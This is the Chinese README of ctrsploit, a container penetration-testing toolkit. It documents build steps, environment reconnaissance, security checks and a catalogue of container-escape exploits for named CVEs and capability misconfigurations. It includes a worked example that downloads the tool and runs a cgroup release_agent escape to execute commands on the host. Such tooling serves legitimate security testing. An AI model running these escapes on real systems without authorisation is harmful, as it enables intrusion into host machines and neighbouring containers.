# ctrsploit: 一个容器场景自动化渗透测试工具

[English Version](./README.md)

ctrsploit 读作container sploit , 遵循 [sploit-spec](https://github.com/ctrsploit/sploit-spec) v0.4.3

## 为什么我们需要ctrsploit

[这里](https://github.com/ctrsploit/ctrsploit/discussions/11)有详细解释

## Pre-Built Release

https://github.com/ctrsploit/ctrsploit/releases

## 手动编译

### 容器编译

```bash
export APT_MIRROR=repo.huaweicloud.com
export GOPROXY=https://goproxy.cn,https://goproxy.io,direct
make binary && ls -lah bin/release
```

### 本地编译

```
make build-ctrsploit
```

## Usage

### Quick-Start

```
wget -O ctrsploit https://github.com/ctrsploit/ctrsploit/releases/download/v0.5.12/ctrsploit_linux_amd64 && chmod +x ctrsploit
./ctrsploit --help
NAME:
   ctrsploit - A penetration toolkit for container environment

               ctrsploit is a command line ... //TODO


USAGE:
   ctrsploit [global options] command [command options] [arguments...]

COMMANDS:
   auto, a      auto gathering information, detect vulnerabilities and run exploits
   env, e       gather information
   exploit, x   run a exploit
   checksec, c  check security inside a container
   helper, he   some helper commands such as local privilege escalation
   version      Show the sploit version information
   help, h      Shows a list of commands or help for one command

GLOBAL OPTIONS:
   --debug         Output information for helping debugging sploit (default: false)
   --experimental  enable experimental feature (default: false)
   --colorful      output colorfully (default: false)
   --json          output in json format (default: false)
   --help, -h      show help
```

### 信息收集

usage

```
root@ctr:/# ./ctrsploit env
NAME:
   ctrsploit env - gather information

USAGE:
   ctrsploit env [command options]

COMMANDS:
   auto                auto
   where, w            detect whether you are in the container, and which type of the container
   mountinfo, m        list mount points
   storage-driver, sd  detect storage driver type and extend information
   cgroups, c          gather cgroup information
   capability, cap     show the capability of pid 1 and current process
   seccomp, sc         show the seccomp info
   apparmor, a         show the apparmor info
   selinux, se         show the selinux info
   fdisk, f            like linux command fdisk or lsblk // TODO
   kernel, k           collect kernel environment information
   namespace, n, ns    check namespace is host ns
   docker-version, dv  guess dockerd version range
   upload, up          upload <servicename> <filename> <obs> [host]
   help, h             Shows a list of commands or help for one command

OPTIONS:
   --help, -h  show help
```

查看当前是否在容器内，在何容器内：

```
root@ctr:/# ./ctrsploit  env  w

===========Container===========
[Y]  Is in Container

===========Docker===========
[Y]  .dockerenv exists
[N]  rootfs contains 'docker'   
[N]  cgroups contains 'docker'
[Y]  the mount source of /etc/hosts contains 'docker'   
[Y]  hostname match regex ^[0-9a-f]12$
---
[Y]  => Is in docker

===========k8s===========
[N]  /var/run/secrets/kubernetes.io exists
[N]  hostname match k8s pattern
[N]  the mount source of /etc/hosts contains 'pods'
[N]  contains 'kubepods'
---
[N]  => is in k8s 
```

### 漏洞利用

```
root@2aa13a052102:/# ./ctrsploit e
NAME:
   ctrsploit exploit - run a exploit

USAGE:
   ctrsploit exploit command [command options] [arguments...]

COMMANDS:
   cgroupv1-release_agent, ra                       escape tech by using the notify_on_release of cgroup v1
   cgroupv1-release_agent-unknown_rootfs, ra3       escape tech by using the notify_on_release of cgroup v1 without known rootfs
   help, h                                          Shows a list of commands or help for one command

OPTIONS:
   --help, -h  show help (default: false)

```

例如: 使用'cgroupv1-release_agent'技术逃逸:

```
root@host # docker run -ti --rm --security-opt="apparmor=unconfined" --cap-add="sys_admin" busybox
root@ctr # wget -O ctrsploit https://github.com/ctrsploit/ctrsploit/releases/download/v0.4/ctrsploit_linux_amd64 && chmod +x ctrsploit
root@ctr # ./ctrsploit e ra -c "cat /etc/hostname"
```

### 安全检查

在容器内执行`ctrsploit checksec`或执行单独的二进制文件`checksec`

```
./checksec_linux_amd64 auto
[N]  cap_sys_admin      # Container can be escaped when has cap_sys_admin and use cgroups v1
[N]  host_net_ns        # The network namespace of the host is shared
...
```

## 详细信息

### env

| 子命令                                   | 简写    | 描述                         |
|---------------------------------------|-------|----------------------------|
| [auto](./env/auto)                    |       | 自动收集环境信息                   |
| [where](./env/where)                  | w     | 检测你是否在容器内，在何种类型的容器内        |
| [storage-driver](./env/storagedriver) | sd    | 检测存储驱动类型和扩展信息              |
| [cgroups](./env/cgroups)              | c     | 收集cgroup信息                 |
| [capability](./env/capability)        | cap   | 显示pid为1的进程和当前进程的capability |
| [seccomp](./env/seccomp)              | sc    | 显示seccomp信息                |
| [apparmor](./env/apparmor)            | a     | 显示apparmor信息               |
| [namespace](./env/namespace)          | n, ns | check namespace is host ns |

### exploit

| exploit                                                                                  | 缩写                  | 简述                                                                 |
|------------------------------------------------------------------------------------------|---------------------|--------------------------------------------------------------------|
| [cgroupv1-release_agent-unknown_rootfs](./exploit/cgroupv1-release_agent-unknown_rootfs) | ra3                 | 在不知道rootfs在宿主机路径时，利用cgroup v1的notify_on_release功能的逃逸技术             |
| [cve-2021-22555_ubuntu18.04](./exploit/CVE-2021-22555_ubuntu18.04)                       | 22555               | 利用CVE-2021-22555的逃逸技术 (ubuntu18.04)                                |
| [cve-2025-23266](./vul/cve-2025-23266)                                                   | 23266               | nvidia-container-toolkit CVE-2025-23266 GPU 容器逃逸                   | 
| [cve-2025-47290](./vul/cve-2025-47290)                                                   | 47290               | containerd cve-2025-47290 镜像解包时可以访问主机文件系统                          | 
| [cve-2024-0132](./vul/cve-2024-0132)                                                     | 0132                | nvidia-container-toolkit CVE-2024-0132 GPU 容器逃逸                    | 
| [cve-2024-23650](./vul/cve-2024-23650)                                                   | 23650               | buildkitd cve-2024-23650 恶意frontend可以发送特制的请求导致panic                | 
| [cve-2022-39253](./vul/cve-2022-39253)                                                   | 39253               | docker build 主机任意文件读(git CVE-2022-39253)                           | 
| [cve-2020-15257](./vul/cve-2020-15257)                                                   | 15257               | containerd cve-2020-15257 共享主机网络的容器逃逸                              | 
| [cve-2016-8867](./vul/cve-2016-8867)                                                     | 8867                | runc cve-2016-8867 容器普通用户借助环境能力集提权                                 | 
| [release_agent](vul/caps/sys_admin/release_agent)                                        | ra                  | 利用cgroup v1的notify_on_release功能的逃逸技术                               |
| [shocker](vul/caps/shocker)                                                              | cap_dac_read_search | 利用 CAP_DAC_READ_SEARCH 逃逸，又称 shocker, 由 Sebastian Krahmer 在2014年发现 |
| [naked](./vul/naked)                                                                     |                     | seccomp, apparmor, selinux 均未开启的容器我们称作'裸奔容器',容易通过内核漏洞逃逸            |
| [ptrace-pid-host](./vul/caps/sys_ptrace/pid_host)                                        | pid                 | 容器具备cap_sys_ptrace和host pid namespace时可通过劫持主机进程被逃逸                 |
| [host-pid-proc-root](./vul/namespace/pid/proc_root)                                      | proc                | 容器具备host pid ns时可以通过/proc/[pid]/root访问主机或其他容器的文件系统                 |
| [docker.sock](./vul/shared-socket/docker-sock)                                           | docker              | 容器中挂载了docker.sock时可以通过创建特权容器来实现逃逸                                  |
| [ebpf-bash](./vul/caps/sys_admin/ebpf/bash)                                              | bash                | Ebpf escape by bash                                                |
| [ebpf-execve](./vul/caps/sys_admin/ebpf/execve)                                          | execve              | Ebpf escape by execve                                              |
| [ebpf-cron](./vul/caps/sys_admin/ebpf/cron)                                              | cron                | Ebpf escape by cron                                                |
| [ebpf-kubelet](./vul/caps/sys_admin/ebpf/kubelet)                                        | cron                | Ebpf escape by leaking k8s service account token via kubelet       |

### vul

* :heavy_check_mark: : 完全支持
* :o: : 部分支持
* :bug: : 支持，但存在已知Bug
* :x: : 不支持
* `-` : 不涉及

| vul                                                                     | check              | exploit            | test                | doc                | video              |
|-------------------------------------------------------------------------|--------------------|--------------------|---------------------|--------------------|--------------------|
| [cve-2016-8867](./vul/cve-2016-8867)                                    | :heavy_check_mark: | :heavy_check_mark: | :heavy_check_mark:  | :heavy_check_mark: | :heavy_check_mark: |
| cve-2016-9962                                                           | :x:                | :x:                | :x:                 | :x:                | :x:                |
| CVE-2017-1002101                                                        | :x:                | :heavy_check_mark: | :x:                 | :x:                | :x:                |
| [cve-2019-5736](./vul/cve-2019-5736)                                    | :heavy_check_mark: | -                  | -                   | :heavy_check_mark: | -                  |
| └─[exec](./vul/cve-2019-5736/exec)                                      | :heavy_check_mark: | :heavy_check_mark: | :heavy_check_mark:  | -                  | :heavy_check_mark: |
| └─[image](./vul/cve-2019-5736/image)                                    | :heavy_check_mark: | :heavy_check_mark: | :heavy_check_mark:  | -                  | :heavy_check_mark: |
| CVE-2019-14271                                                          | :x:                | :heavy_check_mark: | :x:                 | :x:                | :x:                |
| CVE-2019-16884                                                          | :x:                | :heavy_check_mark: | :x:                 | :x:                | :x:                |
| CVE-2020-8555                                                           | :x:                | :heavy_check_mark: | :x:                 | :x:                | :x:                |
| CVE-2020-8558                                                           | :x:                | :heavy_check_mark: | :x:                 | :x:                | :x:                |
| CVE-2020-15157                                                          | :x:                | :heavy_check_mark: | :x:                 | :x:                | :x:                |
| [cve-2020-15257](./vul/cve-2020-15257)                                  | :heavy_check_mark: | :heavy_check_mark: | :heavy_check_mark:  | :heavy_check_mark: | :heavy_check_mark: |
| CVE-2021-3493                                                           | :x:                | :heavy_check_mark: | :x:                 | :x:                | :x:                |
| CVE-2021-21285                                                          | :x:                | :heavy_check_mark: | :x:                 | :x:                | :x:                |
| CVE-2021-22555                                                          | :x:                | :heavy_check_mark: | :x:                 | :x:                | :x:                |
| CVE-2021-41091                                                          | :x:                | :heavy_check_mark: | :x:                 | :x:                | :x:                |
| [cve-2021-25741](./vul/cve-2021-25741)                                  | :heavy_check_mark: | :heavy_check_mark: | :x:                 | :heavy_check_mark: | :x:                |
| [cve-2022-39253](./vul/cve-2022-39253)                                  | :o:                | :heavy_check_mark: | :heavy_check_mark:  | :heavy_check_mark: | :heavy_check_mark: |
| [cve-2022-0492](./vul/cve-2022-0492)                                    | :heavy_check_mark: | :heavy_check_mark: | :heavy_check_mark:  | :heavy_check_mark: | :heavy_check_mark: |
| CVE-2022-0847                                                           | :x:                | :heavy_check_mark: | :x:                 | :x:                | :x:                |
| CVE-2023-28642                                                          | :x:                | :x:                | :x:                 | :x:                | :x:                |
| [cve-2024-0132](./vul/cve-2024-0132)                                    | :o:                | :heavy_check_mark: | :heavy_check_mark:  | :heavy_check_mark: | :heavy_check_mark: |
| [cve-2024-23650](./vul/cve-2024-23650)                                  | :heavy_check_mark: | :heavy_check_mark: | :heavy_check_mark:  | :heavy_check_mark: | :heavy_check_mark: |
| [cve-2025-23266](./vul/cve-2025-23266)                                  | :o:                | :heavy_check_mark: | :heavy_check_mark:  | :heavy_check_mark: | :heavy_check_mark: |
| cve-2025-23267                                                          | :x:                | :x:                | :x:                 | :x:                | :x:                |
| cve-2025-23359                                                          | :x:                | :x:                | :x:                 | :x:                | :x:                |
| cve-2025-31133                                                          | :x:                | :x:                | :x:                 | :x:                | :x:                |
| [cve-2025-47290](./vul/cve-2025-47290)                                  | :heavy_check_mark: | :heavy_check_mark: | :heavy_check_mark:  | :heavy_check_mark: | :heavy_check_mark: |
| cve-2025-52565                                                          | :x:                | :x:                | :x:                 | :x:                | :x:                |
| caps                                                                    | -                  | -                  | -                   | -                  | -                  |
| └─[shocker](./vul/caps/shocker)                                         | :heavy_check_mark: | :heavy_check_mark: | :heavy_check_mark:️ | :heavy_check_mark: | :heavy_check_mark: |
| └─[sys_admin](./vul/caps/sys_admin)                                     | :heavy_check_mark: | -                  | -                   | -                  | -                  |
| &emsp;└─[release_agent](./vul/caps/sys_admin/release_agent)             | :heavy_check_mark: | :heavy_check_mark: | :heavy_check_mark:  | :heavy_check_mark: | :heavy_check_mark: |
| &emsp;└─mount-device                                                    | :x:                | :x:                | :x:                 | :x:                | :x:                |
| &emsp;└─mount-proc                                                      | :x:                | :x:                | :x:                 | :x:                | :x:                |
| &emsp;└─device.allow                                                    | :x:                | :x:                | :x:                 | :x:                | :x:                |
| &emsp;└─[ebpf](./vul/caps/sys_admin/ebpf)                               | :heavy_check_mark: | -                  | -                   | -                  | -                  |
| &emsp;&emsp;└─[ebpf-bash](./vul/caps/sys_admin/ebpf/bash)               | :heavy_check_mark: | :heavy_check_mark: | :heavy_check_mark:  | :heavy_check_mark: | :heavy_check_mark: |
| &emsp;&emsp;└─[ebpf-cron](./vul/caps/sys_admin/ebpf/cron)               | :heavy_check_mark: | :heavy_check_mark: | :heavy_check_mark:  | :heavy_check_mark: | :heavy_check_mark: |
| &emsp;&emsp;└─[ebpf-execve](./vul/caps/sys_admin/ebpf/execve)           | :heavy_check_mark: | :heavy_check_mark: | :heavy_check_mark:  | :heavy_check_mark: | :heavy_check_mark: |
| &emsp;&emsp;└─[ebpf-kubelet](./vul/caps/sys_admin/ebpf/kubelet)         | :heavy_check_mark: | :heavy_check_mark: | :heavy_check_mark:  | :heavy_check_mark: | :heavy_check_mark: |
| &emsp;&emsp;└─ebpf-sshd                                                 | :x:                | :x:                | :x:                 | :x:                | :x:                |
| └─[bpf](./vul/caps/bpf)                                                 | -                  | -                  | -                   | -                  | -                  |
| &emsp;└─[ebpf](./vul/caps/sys_admin/ebpf) (same as caps/sys_admin/ebpf) | :heavy_check_mark: | -                  | -                   | -                  | -                  |
| └─[sys_ptrace](./vul/caps/sys_ptrace)                                   | :heavy_check_mark: | -                  | -                   | -                  | -                  |
| &emsp;└─[pid_host](./vul/caps/sys_ptrace/pid_host)                      | :heavy_check_mark: | :heavy_check_mark: | :heavy_check_mark:  | :heavy_check_mark: | :heavy_check_mark: |
| └─sys_module                                                            | :x:                | :x:                | :x:                 | :x:                | :x:                |
| └─net_admin                                                             | :x:                | :x:                | :x:                 | :x:                | :x:                |
| [naked](./vul/naked)                                                    | :heavy_check_mark: | -                  | :heavy_check_mark:  | :x:                | :x:                |
| namespace                                                               | -                  | -                  | -                   | -                  | -                  |
| └─[net](./vul/namespace/net)                                            | -                  | :x:                | :x:                 | :x:                | :x:                |
| &emsp;└─shijack                                                         | -                  | -                  | -                   | -                  | -                  |
| &emsp;&emsp;└─basic                                                     | :x:                | :x:                | :x:                 | :x:                | :x:                |
| &emsp;&emsp;└─ali                                                       | :x:                | :x:                | :x:                 | :x:                | :x:                |
| &emsp;&emsp;└─hw                                                        | :x:                | :x:                | :x:                 | :x:                | :x:                |
| &emsp;&emsp;└─gcp                                                       | :x:                | :x:                | :x:                 | :x:                | :x:                |
| &emsp;&emsp;└─aws                                                       | :x:                | :x:                | :x:                 | :x:                | :x:                |
| └─[pid](./vul/namespace/pid)                                            | -                  | -                  | -                   | -                  | -                  |
| &emsp;└─[proc_root](./vul/namespace/pid/proc_root)                      | :heavy_check_mark: | :heavy_check_mark: | :heavy_check_mark:  | :heavy_check_mark: | :heavy_check_mark: |
| fs                                                                      | :x:                | :x:                | :x:                 | :x:                | :x:                |
| └─proc-rw                                                               | :x:                | -                  | -                   | :x:                | :x:                |
| &emsp;└─core_pattern                                                    | :x:                | :x:                | :x:                 | :x:                | :x:                |
| &emsp;└─binfmt                                                          | :x:                | :x:                | :x:                 | :x:                | :x:                |
| └─sys-rw                                                                | :x:                | :x:                | :x:                 | :x:                | :x:                |
| └─lxcfs-rw                                                              | :x:                | :x:                | :x:                 | :x:                | :x:                |
| shared-socket                                                           | -                  | -                  | -                   | -                  | -                  |
| └─[docker.sock](./vul/shared-socket/docker-sock)                        | :heavy_check_mark: | :heavy_check_mark: | :heavy_check_mark:  | :heavy_check_mark: | :heavy_check_mark: |
| └─containerd.sock                                                       | :x:                | :x:                | :x:                 | :x:                | :x:                |                                  
| exposed-api                                                             | -                  | -                  | -                   | -                  | -                  |
| └─docker-2375                                                           | :x:                | :x:                | :x:                 | :x:                | :x:                |
| lxcfs                                                                   | :x:                | :x:                | :x:                 | :x:                | :x:                |

### helper

| helper                                  | 缩写                       | description           |
|-----------------------------------------|--------------------------|-----------------------|
| [cve-2021-3493](./helper/cve-2021-3493) | ubuntu-overlayfs-pe,3493 | Ubuntu OverlayFS 本地提权 |
| crash                                   |

### checksec

在容器内执行`ctrsploit checksec`或执行单独的二进制文件`checksec`